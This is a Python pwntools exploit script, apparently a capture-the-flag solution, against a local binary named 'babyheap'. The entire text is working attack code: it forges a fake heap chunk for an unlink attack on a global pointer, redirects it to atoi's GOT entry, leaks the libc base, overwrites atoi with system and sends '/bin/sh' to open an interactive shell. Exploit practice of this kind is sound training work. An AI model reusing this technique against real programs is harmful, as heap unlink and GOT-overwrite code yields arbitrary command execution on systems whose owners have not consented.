from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./babyheap")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./babyheap")
else:
	pass

def menu(choice):
	p.sendafter(">> \n",str(choice) + "\x00")

def add(size,content):
	menu(1)
	p.sendafter("input your name size\n",str(size) + "\x00")
	p.sendafter("input your name\n",content)

def edit(index,size,content):
	menu(2)
	p.sendafter("input index\n",str(index) + "\x00")
	p.sendafter("input your name size\n",str(size) + "\x00")
	p.sendafter("input your name\n",content)

def show(index):
	menu(3)
	p.sendafter("input index\n",str(index) + "\x00")

def free(index):
	menu(4)
	p.sendafter("input index\n",str(index) + "\x00")

def debugf():
	if debug:
		gdb.attach(p,"b *0x0000000000400CCD")

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
debugf()
point = 0x00000000006020C0
add(0x28,"a\n")
add(0xf8,"b\n")
p1 = p64(0) + p64(0x21)
p1 += p64(point - 0x18) + p64(point - 0x10)
p1 += p64(0x20) + "\x00"
edit(0,len(p1),p1)
free(1)

p2 = "a" * 0x18 + p64(elf.got["atoi"])
edit(0,len(p2),p2)
show(0)
leak_addr = u64(p.recv(6).ljust(8,"\x00"))
libc.address = leak_addr - libc.symbols["atoi"]
log.success("libc_base:" + hex(libc.address))

system = libc.symbols["system"]
p3 = p64(system)
edit(0,len(p3),p3)
menu("/bin/sh\x00")
p.interactive()
